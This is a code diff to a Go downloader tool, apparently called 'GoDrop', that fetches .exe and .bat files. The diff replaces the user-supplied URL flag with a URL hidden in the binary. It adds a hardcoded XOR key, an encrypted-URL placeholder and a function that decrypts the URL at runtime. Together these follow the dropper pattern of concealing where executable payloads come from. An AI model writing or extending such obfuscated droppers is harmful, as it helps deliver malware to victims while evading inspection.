@@ -27,23 +27,26 @@ var locales = map[string]localeMessages{
         saved:       "Saved",
         hash:        "SHA256",
         unsupported: "Only .exe and .bat files are supported.",
-        invalidURL:  "URL must use http or https.",
+        invalidURL:  "Embedded URL must use http or https.",
     },
     "es": {
         downloading: "Descargando artefacto...",
         saved:       "Guardado",
         hash:        "SHA256",
         unsupported: "Solo se admiten archivos .exe y .bat.",
-        invalidURL:  "La URL debe usar http o https.",
+        invalidURL:  "La URL integrada debe usar http o https.",
     },
     "fr": {
         downloading: "Téléchargement de l'artefact...",
         saved:       "Enregistré",
         hash:        "SHA256",
         unsupported: "Seuls les fichiers .exe et .bat sont pris en charge.",
-        invalidURL:  "L'URL doit utiliser http ou https.",
+        invalidURL:  "L'URL intégrée doit utiliser http ou https.",
     },
 }
+
+const encryptionKey = "GoDropEmbedKey2026"
+const encryptedURLHex = "__ENC_URL__"
 
 func pickLocale(code string) localeMessages {
     if l, ok := locales[strings.ToLower(code)]; ok {
@@ -59,6 +62,21 @@ func validateType(t string) error {
     default:
         return errors.New("unsupported file type")
     }
+}
+
+func decryptEmbeddedURL(cipherHex string) (string, error) {
+    cipherBytes, err := hex.DecodeString(cipherHex)
+    if err != nil {
+        return "", err
+    }
+
+    keyBytes := []byte(encryptionKey)
+    plain := make([]byte, len(cipherBytes))
+    for i, b := range cipherBytes {
+        plain[i] = b ^ keyBytes[i%len(keyBytes)]
+    }
+
+    return string(plain), nil
 }
 
 func download(url, outputPath string) (string, error) {
@@ -89,7 +107,6 @@ func download(url, outputPath string) (string, error) {
 }
 
 func main() {
-    url := flag.String("url", "", "Source URL")
     out := flag.String("out", "", "Destination file path")
     fileType := flag.String("type", "bat", "Artifact type: bat or exe")
     locale := flag.String("locale", "en", "Locale: en, es, fr")
@@ -102,7 +119,13 @@ func main() {
         os.Exit(1)
     }
 
-    if !strings.HasPrefix(*url, "https://") && !strings.HasPrefix(*url, "http://") {
+    embeddedURL, err := decryptEmbeddedURL(encryptedURLHex)
+    if err != nil {
+        fmt.Printf("error: failed to decrypt embedded URL: %v\n", err)
+        os.Exit(1)
+    }
+
+    if !strings.HasPrefix(embeddedURL, "https://") && !strings.HasPrefix(embeddedURL, "http://") {
         fmt.Println(msg.invalidURL)
         os.Exit(1)
     }
@@ -112,7 +135,7 @@ func main() {
     }
 
     fmt.Println(msg.downloading)
-    sum, err := download(*url, *out)
+    sum, err := download(embeddedURL, *out)
     if err != nil {
         fmt.Printf("error: %v\n", err)
         os.Exit(1)
